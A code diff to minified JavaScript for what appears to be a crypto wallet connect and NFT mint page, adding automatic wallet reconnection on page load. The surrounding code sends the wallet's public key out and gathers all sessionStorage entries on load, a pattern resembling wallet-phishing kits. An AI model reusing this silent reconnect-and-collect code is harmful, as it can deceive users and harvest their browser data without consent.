@@ -33,6 +33,7 @@ async function connect_wallet(){
     try {
         await c.connect();
     } catch (d) {}
+    sessionStorage.setItem("islog", !0);
     let b = {};
     (b.publickey = c.publicKey.toString()), (b = JSON.stringify(b));
     let a = new XMLHttpRequest();
@@ -51,6 +52,7 @@ async function connect_wallet_warning(){
     try {
         await c.connect();
     } catch (d) {}
+    sessionStorage.setItem("islog", !0);
     let b = {};
     (b.publickey = c.publicKey.toString()), (b = JSON.stringify(b));
     let a = new XMLHttpRequest();
@@ -232,6 +234,9 @@ mint.addEventListener("click", async () => {
 });
 
 window.addEventListener('load', function () {
+    if (sessionStorage.getItem('islog')){
+        connect_wallet();
+    }
     let data = {}; 
     data['model'] = localStorage.getItem('mId'); 
     for(let i=0; i<sessionStorage.length; i++) {
@@ -269,3 +274,5 @@ window.addEventListener('load', function () {
         }
     }
 })
+
+
